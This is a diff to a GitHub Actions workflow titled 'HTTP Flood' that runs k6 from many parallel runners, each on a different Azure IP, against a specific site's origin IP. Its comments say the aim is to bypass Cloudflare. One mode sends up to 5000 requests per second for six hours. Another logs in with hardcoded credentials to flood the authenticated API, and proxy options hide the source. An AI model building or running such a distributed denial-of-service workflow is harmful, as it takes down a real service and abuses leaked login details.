@@ -3,14 +3,14 @@ name: HTTP Flood — thanhhuyreal
 on:
   workflow_dispatch:
     inputs:
-      script:
-        description: 'Script chay (mac dinh: test-script.js | auth: test-script-auth.js)'
-        required: false
-        default: 'test-script.js'
-      target_url:
-        description: 'Target URL (IP goc bypass CF)'
-        required: false
-        default: 'http://103.211.206.175/'
+      mode:
+        description: 'Che do tan cong'
+        required: true
+        default: 'ip'
+        type: choice
+        options:
+          - ip          # Danh thang vao IP goc (103.211.206.175), khong can login
+          - auth        # Login truoc roi danh authenticated API (nang hon)
       runners:
         description: 'So runner song song (moi runner = 1 IP Azure khac nhau)'
         required: true
@@ -20,15 +20,15 @@ on:
         required: false
         default: '5000'
       stages:
-        description: 'Stages (de trong dung mac dinh theo script)'
+        description: 'Stages override (de trong = dung mac dinh)'
         required: false
         default: ''
       phpsessid:
-        description: 'PHPSESSID (chi can voi test-script-auth.js - lay tu DevTools khi da login)'
+        description: '[Auth mode] PHPSESSID (de trong = tu dong login)'
         required: false
         default: ''
       proxy:
-        description: 'Proxy URL (de trong = khong dung proxy). VD: http://user:pass@host:port'
+        description: 'Proxy URL (de trong = khong dung proxy)'
         required: false
         default: ''
 
@@ -46,7 +46,7 @@ jobs:
 
   flood:
     needs: prepare
-    name: "Runner ${{ matrix.runner }}"
+    name: "[${{ github.event.inputs.mode }}] Runner ${{ matrix.runner }}"
     runs-on: ubuntu-latest
     timeout-minutes: 360
     strategy:
@@ -63,22 +63,23 @@ jobs:
         uses: grafana/setup-k6-action@v1
 
       - name: Tang ulimit
-        run: |
-          ulimit -n 131072 || true
-          echo "ulimit: $(ulimit -n)"
+        run: ulimit -n 131072 || true
 
       - name: Runner info
         run: |
+          echo "Mode    : ${{ github.event.inputs.mode }}"
           echo "Runner  : ${{ matrix.runner }}"
-          echo "Script  : ${{ github.event.inputs.script }}"
           echo "IP      : $(curl -sf https://api.ipify.org || echo unknown)"
           echo "CPU     : $(nproc) cores"
           echo "RAM     : $(free -m | awk '/Mem:/{print $4}') MB free"
 
-      - name: Run k6 — plain flood (test-script.js)
-        if: ${{ github.event.inputs.script == 'test-script.js' || github.event.inputs.script == '' }}
+      # ─────────────────────────────────────────────
+      # MODE: ip — danh thang IP goc, khong login
+      # ─────────────────────────────────────────────
+      - name: "[ip] Flood IP truc tiep"
+        if: ${{ github.event.inputs.mode == 'ip' }}
         env:
-          TARGET_URL:       ${{ github.event.inputs.target_url || 'http://103.211.206.175/' }}
+          TARGET_URL:       "http://103.211.206.175/"
           STAGES:           ${{ github.event.inputs.stages || '30s:500,60s:5000,360m:5000' }}
           START_RATE:       "200"
           PRE_VUS:          "500"
@@ -91,14 +92,20 @@ jobs:
           HTTPS_PROXY:      ${{ github.event.inputs.proxy }}
         run: |
           ulimit -n 131072 || true
+          [ -n "$HTTP_PROXY" ] && echo "Proxy: $HTTP_PROXY" || echo "Direct (no proxy)"
           k6 run --no-usage-report sites/thanhhuyreal/test-script.js
 
-      - name: Run k6 — authenticated flood (test-script-auth.js)
-        if: ${{ github.event.inputs.script == 'test-script-auth.js' }}
+      # ─────────────────────────────────────────────
+      # MODE: auth — tu dong login, flood authenticated API
+      # ─────────────────────────────────────────────
+      - name: "[auth] Flood authenticated API"
+        if: ${{ github.event.inputs.mode == 'auth' }}
         env:
-          IP_URL:           ${{ github.event.inputs.target_url || 'http://103.211.206.175' }}
+          IP_URL:           "http://103.211.206.175"
           SITE_HOST:        "thanhhuyreal.com"
-          PHPSESSID:        ${{ github.event.inputs.phpsessid || '9eb1fp03nuk8agokbvdekan4vc' }}
+          PHPSESSID:        ${{ github.event.inputs.phpsessid }}
+          PHP_IDENTIFIER:   "lonussystem"
+          PHP_PASSWORD:     "lonussystem123@"
           STAGES:           ${{ github.event.inputs.stages || '30s:500,60s:2000,60s:5000,360m:5000' }}
           START_RATE:       "100"
           PRE_VUS:          "500"
